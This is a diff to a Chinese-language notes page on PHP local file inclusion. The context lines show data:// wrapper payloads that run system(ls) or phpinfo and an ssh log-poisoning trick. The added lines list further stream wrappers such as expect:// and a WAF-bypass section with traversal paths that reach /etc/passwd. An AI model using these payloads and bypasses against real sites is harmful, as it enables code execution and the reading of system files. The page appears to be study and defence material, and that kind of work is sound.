@@ -39,6 +39,7 @@ data:URL schema
 ?file=data:text/plain,<?php system(ls);?>
 ?file=data:text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b (base64編碼phpinfo)
 ```  
+試試了解更多協議：`file://`,`ftp://`,`zlib://`,`glob://`,`ssh2://`,`rar://`,`ogg://`,`expect://`  
 2. include session  
 session內容可控，session路徑已知...  
 session路徑可以透過phpinfo中`session_save_path`得知  
@@ -69,6 +70,22 @@ ssh '<?php phpinfo();?>'@remotehost
 6. include fd  
 7. include temp file  
 8. include uploaded file  
+
+# WAF繞過  
+* 相對路徑繞過  
+WAF通常會檢測**連續**幾個`../`
+```php
+// 根據路徑解析
+
+//不變
+/./不變
+///./..//.//////./ 混著用
+```  
+* 絕對路徑繞過，`/etc/passwd`會被擋  
+```php
+/aaa/../etc/passwd
+/etc/./passwd
+```
 
 # 防禦手勢  
 稍微總結一下上面的條件，可以得到下面mitigation的手法  
